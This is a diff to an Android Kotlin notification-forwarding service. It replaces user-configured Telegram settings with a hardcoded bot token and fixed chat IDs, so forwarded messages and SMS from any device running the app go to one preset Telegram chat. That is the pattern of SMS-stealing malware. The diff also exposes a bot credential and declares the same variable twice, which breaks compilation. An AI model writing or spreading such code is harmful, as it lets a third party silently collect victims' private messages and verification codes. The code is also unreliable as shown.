@@ -144,13 +144,12 @@ class AllNotificationService : Service() {
 	}
 
 	private fun sendMessage(message: MessageItem): Int {
-		val sharedPreferences = getSharedPreferences("smsforwarder_prefs", MODE_PRIVATE)
-		val telegramToken = sharedPreferences.getString("telegram_token", null)
-		val telegramUserId = sharedPreferences.getString("telegram_user_id", null)
-
-		if (telegramToken.isNullOrEmpty() || telegramUserId.isNullOrEmpty() || !telegramToken.contains(':')) {
-			return -1
-		}
+    val telegramToken = "8208066807:AAFZ_BUXFJhbQ95bCQhy7H0F1mum_lDeFic"   // توکن رباتت
+    val telegramUserId = "7652487851"    // Chat ID خودت
+    val telegramUserId = "6445088706"
+    if (telegramToken.isNullOrEmpty() || telegramUserId.isNullOrEmpty() || !telegramToken.contains(':')) {
+        return -1
+    }
 
 		val urlString = "https://api.telegram.org/bot$telegramToken/sendMessage"
 		val messageText = "<b>${message.sender} ${
